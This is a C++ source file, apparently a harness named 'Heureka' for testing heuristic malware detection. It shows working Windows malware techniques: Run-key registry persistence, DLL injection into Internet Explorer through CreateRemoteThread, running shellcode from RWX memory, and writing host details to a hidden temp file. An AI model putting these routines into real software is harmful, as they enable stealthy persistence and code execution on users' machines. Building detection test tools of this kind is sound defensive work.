#include<iostream>
#include<Windows.h>
#include<ctime>
#include<psapi.h>
#include "heurekaconfig.h"

// namespace setup
using namespace std;

// utility functions
void print_status(const char *status){
	cout << "[+] " << status << endl;
}

void print_error(const char *status){
	cout << "[!] " << status << endl;
}

// test functions

#if SET_STARTUP_REGISTRY==1
void set_startup_registry(){
	char mypath[MAX_PATH];
	HKEY hk;
	DWORD dwDisp;

	print_status("set_startup_registry starts");
	
	GetModuleFileName( NULL, mypath, MAX_PATH );
	
	if (DWORD err=RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hk, &dwDisp)){
		print_error("Could not create the registry key.");
		return;
	}
	if (RegSetValueEx(hk,       // subkey handle 
			"Heureka",			// value name 
			0,                  // must be zero 
			REG_SZ,      // value type 
			(LPBYTE) mypath,	// pointer to value data 
			(DWORD) (strlen(mypath)+1))) // data size
	{
      print_error("Could not set startup value."); 
	}
	RegCloseKey(hk); 
	print_status("set_startup_registry ends");
}
#endif

#if DLL_INJECT_IE==1
void dll_inject_ie(){
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

	print_status("dll_inject_ie starts");

	HMODULE hKernel32=GetModuleHandle("Kernel32");
	FARPROC aLoadLibrary=GetProcAddress(hKernel32,"LoadLibraryA");
	
    unsigned int i;



	ZeroMemory(&si,sizeof(si));
	si.cb=sizeof(si);
	ZeroMemory(&pi,sizeof(pi));
	
	if( !CreateProcess( IE_PATH,   
        "",				// Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        print_error( "CreateProcess failed (IE)");
        return;
    }

	
	print_status("IE process created");

	void* pLibRemote=VirtualAllocEx(pi.hProcess, NULL, sizeof(HEUREKADLL_PATH),MEM_COMMIT, PAGE_READWRITE );
	WriteProcessMemory(pi.hProcess, pLibRemote, (void*)HEUREKADLL_PATH,sizeof(HEUREKADLL_PATH), NULL );
	
	HANDLE hThread=CreateRemoteThread( pi.hProcess, NULL, 0,(LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32,"LoadLibraryA" ),pLibRemote, 0, NULL );
	
	WaitForSingleObject( hThread, INFINITE );
	CloseHandle(hThread);
	
	WaitForSingleObject(pi.hProcess, INFINITE );
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	print_status("dll_inject_ie ends");
}
#endif

#if SHELLCODE==1 && ALLOC_RWX_CALL==1
/*
Allocates writable and executable memory, writes and runs shellcode.
*/
void alloc_rwx_call(){
	print_status("alloc_rwx_call starts");
	LPVOID p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(p,shellcode,sizeof(shellcode));
	((void(*)())p)();
	VirtualFree(p,NULL,MEM_RELEASE);
	print_status("alloc_rwx_call ends");
}
#endif

#if WRITE_LOG==1
/*
Creates a hidden file in a temporary directory and writes information about the local host.
*/
void write_log(){
	print_status("write_log starts");
	HANDLE hFile;
	
	TCHAR tmppath[MAX_PATH];
	DWORD err;
	
	ZeroMemory(tmppath,MAX_PATH);
	err=GetTempPath(MAX_PATH,tmppath);
	if (err>MAX_PATH || err==0){
		print_error("Unable to retreive TEMP path");
		return;
	}
	if (strcat_s(tmppath,MAX_PATH,"heureka.dll")!=0){
		print_error("Unable to generate TEMP filename");
	}

	hFile=CreateFile(tmppath,FILE_GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
	if (hFile==INVALID_HANDLE_VALUE){
		err=GetLastError();
		print_error("Unable to create file in TEMP");
		return;
	}

	TCHAR buffer[256] = TEXT("");
    
    DWORD dwSize = sizeof(buffer);
    DWORD dwWritten=0;

	char time_buf[22];
	time_t now;
	time(&now);
	strftime(time_buf, 22, "%Y-%m-%dT%H:%S:%MZ\0", gmtime(&now));
	WriteFile(hFile, time_buf, strlen(time_buf),&dwWritten,NULL);
			
    for (int cnf = 0; cnf < ComputerNameMax; cnf++)
    {
        if (!GetComputerNameEx((COMPUTER_NAME_FORMAT)cnf, buffer, &dwSize))
        {
            print_error("GetComputerNameEx failed");
            return;
        }
        else{ 
			WriteFile(hFile, buffer, dwSize,&dwWritten,NULL);
		}
        dwSize = _countof(buffer);
        ZeroMemory(buffer, dwSize);
    }

	CloseHandle(hFile);
	print_status("write_log ends");
}
#endif

// end of test functions - program entry point 
int main(int argc,char **argv){
	// set everything up
	setvbuf(stdout, NULL, _IONBF, 0);
	
	// test functions

	#if WRITE_LOG==1
	write_log();
	#endif

	#if SHELLCODE==1 && ALLOC_RWX_CALL==1
	alloc_rwx_call();
	#endif

	#if DLL_INJECT_IE==1
	dll_inject_ie();
	#endif

	#if SET_STARTUP_REGISTRY==1
	set_startup_registry();
	#endif
	// clean up and exit
	return 1;
}